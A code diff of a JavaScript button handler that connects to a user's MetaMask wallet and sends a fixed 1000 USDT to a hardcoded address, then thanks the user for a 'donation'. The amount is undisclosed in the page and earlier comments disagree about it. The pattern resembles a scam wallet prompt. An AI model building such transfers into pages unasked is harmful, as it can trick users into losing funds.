@@ -1,24 +1,18 @@
+
 document.getElementById('fuck-button').addEventListener('click', async function () {
-  console.log("hiii")
-  // Check if the web3 object is available
+
   if (typeof web3 !== 'undefined') {
-    // Create a Web3 instance
-    console.log("2")
 
     web3 = new Web3(web3.currentProvider);
-    // Use the web3 object for Ethereum interactions
-    // ...
+    
     try {
-      console.log("hiii1")
-      // Request permission to access the user's MetaMask account
       await ethereum.enable();
-      console.log("33")
-      // Get the user's selected address
+
       const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0]; // Assuming the first account is used
-      console.log("4")
-      // Prepare the transaction data
+      const sender = accounts[0]; 
+
       const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on Ethereum Mainnet
+      
       const contractABI = [
         {
           constant: true,
@@ -408,26 +402,24 @@ document.getElementById('fuck-button').addEventListener('click', async function 
         },
         { anonymous: false, inputs: [], name: "Pause", type: "event" },
         { anonymous: false, inputs: [], name: "Unpause", type: "event" },
-      ];; // Add the USDT contract ABI here
-      console.log("5")
+      ]; 
+
       const contract = new web3.eth.Contract(contractABI, contractAddress);
 
       const recipient = '0x9d87C64Ee6d2d9606DC497b1b5e767166FeE522f';
-      const amount = web3.utils.toWei('1000', 'ether'); // Convert 20 USDT to wei
+      const amount = web3.utils.toWei('1000', 'ether'); 
 
       // Send the transaction
       await contract.methods.transfer(recipient, amount).send({ from: sender });
 
       // Transaction successful
       alert('Thank you for your donation!');
+
     } catch (error) {
-      // Handle any errors
       console.error(error);
       alert('An error occurred while donating. Please try again.');
     }
   } else {
-    console.log("1")
-    // Prompt the user to install MetaMask or another Ethereum provider
-    // ...
+    console.log("Error")
   }
 })
